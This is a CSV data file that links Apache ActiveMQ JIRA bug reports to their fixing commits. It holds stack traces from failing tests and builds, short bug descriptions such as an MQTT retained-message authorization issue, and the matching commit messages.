bug id,bug key,bug description,commit hash,commit msg
12711133,AMQ-5164,"This test currently fails with the following error:

testAdvisory(org.apache.activemq.broker.ft.QueueMasterSlaveSingleUrlTest)  Time elapsed: 24.891 sec  <<< FAILURE!
junit.framework.AssertionFailedError: Didn't received advisory
	at junit.framework.Assert.fail(Assert.java:57)
	at junit.framework.Assert.assertTrue(Assert.java:22)
	at junit.framework.Assert.assertNotNull(Assert.java:256)
	at junit.framework.TestCase.assertNotNull(TestCase.java:426)
	at org.apache.activemq.broker.ft.QueueMasterSlaveTestSupport.testAdvisory(QueueMasterSlaveTestSupport.java:153)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:606)
	at junit.framework.TestCase.runTest(TestCase.java:176)
	at junit.framework.TestCase.runBare(TestCase.java:141)
	at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:107)
	at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:113)
	at junit.framework.TestResult$1.protect(TestResult.java:122)
	at junit.framework.TestResult.runProtected(TestResult.java:142)
	at junit.framework.TestResult.run(TestResult.java:125)
	at junit.framework.TestCase.run(TestCase.java:129)
	at junit.framework.TestSuite.runTest(TestSuite.java:255)
	at junit.framework.TestSuite.run(TestSuite.java:250)
	at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:84)
	at org.apache.maven.surefire.junit4.JUnit4Provider.execute(JUnit4Provider.java:254)
	at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:149)
	at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:124)
	at org.apache.maven.surefire.booter.ForkedBooter.invokeProviderInSameClassLoader(ForkedBooter.java:200)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:153)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:103)


Results :

Failed tests: 
  QueueMasterSlaveSingleUrlTest>CombinationTestSupport.runBare:113->CombinationTestSupport.runBare:107->QueueMasterSlaveTestSupport.testAdvisory:153 Didn't received advisory

Tests run: 1, Failures: 1, Errors: 0, Skipped: 0

",b0bf144e7a6473f207e4897f9a0971665f0e2b66,"Ignoring testAdvisory test for now, see https://issues.apache.org/jira/browse/AMQ-5164"
12710147,AMQ-5160,"I am using MQTT on AMQ 5.9.1
After latest MQTT hardening from [~dhirajsb] , there is an issue of MQTT retained messages.

Simple case:
Set Authentication / Authorization for two different TOPICS.
Send retained message to one topic.

Try to subscribe ""#"" with other second user.
It will show retained messages published by TOPIC 1. 

here i have attached test configurations.

",c915b19a205d37c2faad05178de716dca64981d5,"Fixed AMQ-5160, removed producer's retain property from retained messages"
12710147,AMQ-5160,"I am using MQTT on AMQ 5.9.1
After latest MQTT hardening from [~dhirajsb] , there is an issue of MQTT retained messages.

Simple case:
Set Authentication / Authorization for two different TOPICS.
Send retained message to one topic.

Try to subscribe ""#"" with other second user.
It will show retained messages published by TOPIC 1. 

here i have attached test configurations.

",3ba129561c28b3ac36a7d8a8b677cf13797bec9b,https://issues.apache.org/jira/browse/AMQ-5160 - start/stop wrapped policy
12709191,AMQ-5153,LevelDB store does not save the subscribedDestination of the SubscriptionInfo for a durable subscription.  This is important because when a restart happens you have no clue if this durable subscription goes with the topic or to a different topic (because of wildcarding).,01f56d0ca255852bf9c12b889abd8d1297a2b5a9,unit tests for https://issues.apache.org/jira/browse/AMQ-5153 LevelDB does not store subscribedDestination for durable subscriptions
12706626,AMQ-5136,"When sending a message to a topic using a transacted session, memory usage is not decremented correctly when session.rollback is called. It is decremented on commit but not on rollback. This has quite bad consequences since after some time depending on the system memory usage settings and amount of rolled back messages, the broker starts to reject messages saying that Usage Manager memory limit is reached. The only solution is to restart the broker.
I created a small Maven project (see the attachment) with a unit test starting an embedded broker and two test methods: one sending messages with session.commit and another with session.rollback(). The last one fails to assert the memory usage. In the output one can see quite a lot of error logs written by ActiveMQ. The problem is reproducible with 5.8.0 and 5.9.0.
The problem seems to be in org.apache.activemq.broker.region.Topic#doMessageSend method where a transaction synchronization is registered. In the transaction synchronization only afterCommit is supplied, but no afterRollback. So there seems to be nobody calling message.decrementReferenceCount().
",c5c1495330dbad20c2f25e4b44f017005fb97a42,https://issues.apache.org/jira/browse/AMQ-5136 - fix and test (thanks barlabanov)
12702417,AMQ-5110,When an AMQP transaction is committed or rolled back the broker settles the delivery but does not set an Accepted outcome on the delivery.  The spec indicates that a proper discharge response will contain an accepted outcome along with being remotely settled.  ,e06e23b9f331facd3bdb44980a206a367bd47b52,"https://issues.apache.org/jira/browse/AMQ-5110

Set accepted outcome for successful commit and rollback."
12702120,AMQ-5106,"Hi I'm not able to complete the mvn eclipse:clean eclise:eclipse on the trunk due to a missing jar.
org.apache.xerces:xercesImpl:jar:2.11.0
could not be located over default repository (and I've no local copy).
Please add some repository or deploy it over officials repo.

Here is the stack trace:

org.apache.maven.lifecycle.LifecycleExecutionException: Failed to execute goal on project activemq-karaf-itest: Could not resolve dependencies for project org.apache.activemq:activemq-karaf-itest:jar:5.10-SNAPSHOT: Could not find artifact org.apache.xerces:xercesImpl:jar:2.11.0 in repo.jenkins-ci.org (http://repo.jenkins-ci.org/public/)
        at org.apache.maven.lifecycle.internal.LifecycleDependencyResolver.getDependencies(LifecycleDependencyResolver.java:220)
        at org.apache.maven.lifecycle.internal.LifecycleDependencyResolver.resolveProjectDependencies(LifecycleDependencyResolver.java:127)
        at org.apache.maven.lifecycle.internal.MojoExecutor.ensureDependenciesAreResolved(MojoExecutor.java:257)
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:200)
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:153)
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:145)
        at org.apache.maven.lifecycle.internal.MojoExecutor.executeForkedExecutions(MojoExecutor.java:364)
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:198)
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:153)
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:145)
        at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:84)
        at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:59)
        at org.apache.maven.lifecycle.internal.LifecycleStarter.singleThreadedBuild(LifecycleStarter.java:183)
        at org.apache.maven.lifecycle.internal.LifecycleStarter.execute(LifecycleStarter.java:161)
        at org.apache.maven.DefaultMaven.doExecute(DefaultMaven.java:318)
        at org.apache.maven.DefaultMaven.execute(DefaultMaven.java:153)
        at org.apache.maven.cli.MavenCli.execute(MavenCli.java:555)
        at org.apache.maven.cli.MavenCli.doMain(MavenCli.java:214)
        at org.apache.maven.cli.MavenCli.main(MavenCli.java:158)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced(Launcher.java:290)
        at org.codehaus.plexus.classworlds.launcher.Launcher.launch(Launcher.java:230)
        at org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode(Launcher.java:414)
        at org.codehaus.plexus.classworlds.launcher.Launcher.main(Launcher.java:357)
Caused by: org.apache.maven.project.DependencyResolutionException: Could not resolve dependencies for project org.apache.activemq:activemq-karaf-itest:jar:5.10-SNAPSHOT: Could not find artifact org.apache.xerces:xercesImpl:jar:2.11.0 in repo.jenkins-ci.org (http://repo.jenkins-ci.org/public/)
        at org.apache.maven.project.DefaultProjectDependenciesResolver.resolve(DefaultProjectDependenciesResolver.java:198)
        at org.apache.maven.lifecycle.internal.LifecycleDependencyResolver.getDependencies(LifecycleDependencyResolver.java:195)
        ... 26 more
Caused by: org.eclipse.aether.resolution.DependencyResolutionException: Could not find artifact org.apache.xerces:xercesImpl:jar:2.11.0 in repo.jenkins-ci.org (http://repo.jenkins-ci.org/public/)
        at org.eclipse.aether.internal.impl.DefaultRepositorySystem.resolveDependencies(DefaultRepositorySystem.java:384)
        at org.apache.maven.project.DefaultProjectDependenciesResolver.resolve(DefaultProjectDependenciesResolver.java:192)
        ... 27 more
Caused by: org.eclipse.aether.resolution.ArtifactResolutionException: Could not find artifact org.apache.xerces:xercesImpl:jar:2.11.0 in repo.jenkins-ci.org (http://repo.jenkins-ci.org/public/)
        at org.eclipse.aether.internal.impl.DefaultArtifactResolver.resolve(DefaultArtifactResolver.java:459)
        at org.eclipse.aether.internal.impl.DefaultArtifactResolver.resolveArtifacts(DefaultArtifactResolver.java:262)
        at org.eclipse.aether.internal.impl.DefaultRepositorySystem.resolveDependencies(DefaultRepositorySystem.java:367)
        ... 28 more
Caused by: org.eclipse.aether.transfer.ArtifactNotFoundException: Could not find artifact org.apache.xerces:xercesImpl:jar:2.11.0 in repo.jenkins-ci.org (http://repo.jenkins-ci.org/public/)
        at org.eclipse.aether.connector.wagon.WagonRepositoryConnector$6.wrap(WagonRepositoryConnector.java:1012)
        at org.eclipse.aether.connector.wagon.WagonRepositoryConnector$6.wrap(WagonRepositoryConnector.java:1004)
        at org.eclipse.aether.connector.wagon.WagonRepositoryConnector$GetTask.run(WagonRepositoryConnector.java:725)
        at org.eclipse.aether.util.concurrency.RunnableErrorForwarder$1.run(RunnableErrorForwarder.java:67)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:662)
[ERROR] 
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/DependencyResolutionException
[ERROR] 
[ERROR] After correcting the problems, you can resume the build with the command
[ERROR]   mvn <goals> -rf :activemq-karaf-itest",6056fde7ed0f47505b9ad84728bd9c3399a9d32b,https://issues.apache.org/jira/browse/AMQ-5106 - apply patch with thanks from carlo cancellieri - This closes #17
12701485,AMQ-5102,"This test fails intermittently with the error below.  This is a pretty marginal case; it never fails on my laptop, and it doesn't fail on CI boxes when run on its own, only when all tests are run.

testSendHugeMessage(org.apache.activemq.transport.amqp.bugs.AMQ4914Test)  Time elapsed: 303.375 sec  <<< ERROR!
java.lang.Exception: test timed out after 300000 milliseconds
	at java.lang.Object.wait(Native Method)
	at java.lang.Object.wait(Object.java:485)
	at org.apache.qpid.amqp_1_0.client.Receiver.receiveFromPrefetch(Receiver.java:328)
	at org.apache.qpid.amqp_1_0.client.Receiver.receive(Receiver.java:258)
	at org.apache.qpid.amqp_1_0.jms.impl.MessageConsumerImpl.receive0(MessageConsumerImpl.java:291)
	at org.apache.qpid.amqp_1_0.jms.impl.MessageConsumerImpl.receiveImpl(MessageConsumerImpl.java:260)
	at org.apache.qpid.amqp_1_0.jms.impl.MessageConsumerImpl.receive(MessageConsumerImpl.java:235)
	at org.apache.qpid.amqp_1_0.jms.impl.MessageConsumerImpl.receive(MessageConsumerImpl.java:57)
	at org.apache.activemq.transport.amqp.bugs.AMQ4914Test.doTestSendLargeMessage(AMQ4914Test.java:104)
	at org.apache.activemq.transport.amqp.bugs.AMQ4914Test.testSendHugeMessage(AMQ4914Test.java:80)",4e79e43905989549c8c75cc2364e1b16c22301ed,Added @Ignore for AMQ-5102 until proton 0.7 is released
12694611,AMQ-5043,<NA>,706830268e1cecfe165feb444ee5b62e954e7d33,More improvements for AMQ-5043.  Drop all messages sent to topics starting '$' to honor MQTT 3.1.1 spec requirments.
12694481,AMQ-5041,"The JMSClientTest is currently hanging on multiple test cases.  I'll attach a stack trace, but it looks like the test is hanging during the broker.stop in tearDown().

I'm going to add @Ignore tags to most of the tests so this stops hanging CI builds.  ",a165054df9c354ff17856fe8e6390c09bfdf6a2d,Added multiple @Ignores to keep this test from hanging and blocking CI builds.  AMQ-5041
12693441,AMQ-5029,"
When using jetty:run in activemq-web-console or deploying the war into tomcat, the activemq.data system property is not resolved into a directory name for the kahadb.   Thus, a ${acitvemq.data} directory is created which is strange looking.   The property placeholder thing needs to be added to the spring config.",17d1489c62b6bc33b77bce38eeecdc357f9c61bf,[AMQ-5029] embedded webconsole broker does not resolve activemq.data system property
12693070,AMQ-5021,"org.apache.activemq.bugs.MemoryUsageBlockResumeTest sometimes hangs, which can block CI builds.  I will update it to JUnit4 and add a timeout so it at least does not cause the build to hang.

I am also attaching a stack trace.
",5a80cee9608fdf93fde7d5b132d6ddd8a9eba946,"Converted to JUnit4 because of CI hangs, see AMQ-5021"
12692105,AMQ-5002,<NA>,875822de5172607496e7bd219a177213df92b7cd,Fixes AMQ-5002: Support receiving AMQP messages which do not have the timestamp set but the expiration is set.
12691633,AMQ-4995,"When we change destination interceptor we need to reapply it to all destination as otherwise the effects will have no change. An example is changing property like ""forwardOnly"" in the following configuration

{code}<destinationInterceptors>
    <virtualDestinationInterceptor>
       <virtualDestinations>
           <compositeQueue forwardOnly=""false"" name=""VirtualDestination.CompositeQueue"">
               <forwardTo>
                   <queue physicalName=""VirtualDestination.QueueConsumer""/>
                   <topic physicalName=""VirtualDestination.TopicConsumer""/>
               </forwardTo>
           </compositeQueue>
       </virtualDestinations>
    </virtualDestinationInterceptor>
</destinationInterceptors>{code}",55da9bc821184a320fc551ec8e131d1dcbf0d2bb,https://issues.apache.org/jira/browse/AMQ-4995 - reapply destination interceptor after change
